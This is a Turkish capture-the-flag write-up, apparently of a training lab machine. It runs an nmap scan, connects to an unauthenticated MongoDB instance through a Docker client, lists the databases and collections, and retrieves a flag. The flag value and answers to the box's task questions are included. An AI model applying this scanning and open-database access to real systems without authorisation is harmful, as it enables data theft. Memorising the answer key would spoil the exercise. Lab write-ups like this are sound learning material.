## Nmap Taraması

```
nmap -sS -A -p- -T5 10.129.228.30
```

<img width="686" height="466" alt="nmap" src="https://github.com/user-attachments/assets/197b53fb-53ab-4260-93a7-6a0aadf6edd0" />


İki açık port var: 22'de standart bir SSH servisi, 27017'de ise asıl dikkatimi çeken şey — MongoDB 3.6.8. SSH tarafında elimde kimlik bilgisi olmadığı için şu an için orayı bir kenara bıraktım, MongoDB'ye odaklandım.

Nmap'in `mongodb-info` script çıktısında sunucunun authentication olmadan ayakta olduğunu gösteren bir detay dikkatimi çekti: `Access control is not enabled for the database` uyarısı loglara zaten yansımıştı, yani kullanıcı adı/parola sormadan direkt bağlanabileceğim bir MongoDB instance'ıyla karşı karşıyaydım. Ayrıca aynı script çıktısında sunucudaki veritabanlarının bir listesi de geliyordu:

```
databases:
  admin
  config
  local
  sensitive_information
  users
```

`sensitive_information` ismi zaten kendini ele veriyordu, oradan başlamaya karar verdim.

## MongoDB'ye Bağlanma

Kali'deki mongo client sürümü hedef sunucuyla (3.6.8) uyumlu çıkmadı, bağlantı hatası aldım. Sorunu aşmak için hedefle aynı sürümde bir MongoDB Docker image'ı çektim ve onun üzerinden bağlandım:

```
docker run -it --rm mongo:3.6 mongo --host 10.129.228.30 --port 27017
```

<img width="595" height="40" alt="dockerpayload" src="https://github.com/user-attachments/assets/7ebe9988-9754-4ab5-9146-f86996db1b1a" />


Bağlantı sorunsuz kuruldu, herhangi bir kimlik bilgisi istemedi. Server loglarında da bunu doğrulayan satır vardı:

```
** WARNING: Access control is not enabled for the database.
**          Read and write access to data and configuration is unrestricted.
```

Yani sunucuya erişebilen herkes okuma/yazma yapabiliyor.

## Veritabanlarını ve Koleksiyonları Keşfetme

Bağlandıktan sonra ilk iş mevcut veritabanlarını listelemek oldu:

```
> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
```

Sırayla gezdim. `admin`, `config` ve `local` beklenen sistem veritabanlarıydı, içlerinde ilginç bir şey yoktu. `users` veritabanına geçtiğimde `ecommerceWebapp` isimli bir koleksiyon gördüm ama asıl hedefim zaten belliydi:

```
> use sensitive_information
switched to db sensitive_information
> show collections
flag
```

`flag` isimli bir koleksiyon direkt karşıma çıktı, fazla düşünmeye gerek kalmadı.

## Flag'i Okuma

![Uploading flag.png…]()

Flag bu şekilde elde edildi:

```
1b6e6fb359e7c40241b6d431427ba6ea
```

## Görev Soruları ve Cevapları

**Görev 1 — Makinede kaç adet TCP portu açık?**
2 (22/tcp ve 27017/tcp)

**Görev 2 — Uzak sunucunun 27017 numaralı portunda hangi servis çalışıyor?**
MongoDB

**Görev 3 — MongoDB ne tür bir veritabanıdır? (SQL veya NoSQL)**
NoSQL

**Görev 4 — Terminalden etkileşimli MongoDB kabuğunu başlatmak için hangi komut kullanılır?**
`mongo`

**Görev 5 — MongoDB sunucusunda bulunan tüm veritabanlarını listelemek için kullanılan komut nedir?**
`show dbs`

**Görev 6 — Veritabanındaki koleksiyonları listelemek için kullanılan komut nedir?**
`show collections`

**Görev 7 — Belirtilen koleksiyon içindeki tüm belgelerin içeriğini dışa aktarmak için hangi komut kullanılır (`flag`)?**
`db.flag.find()`
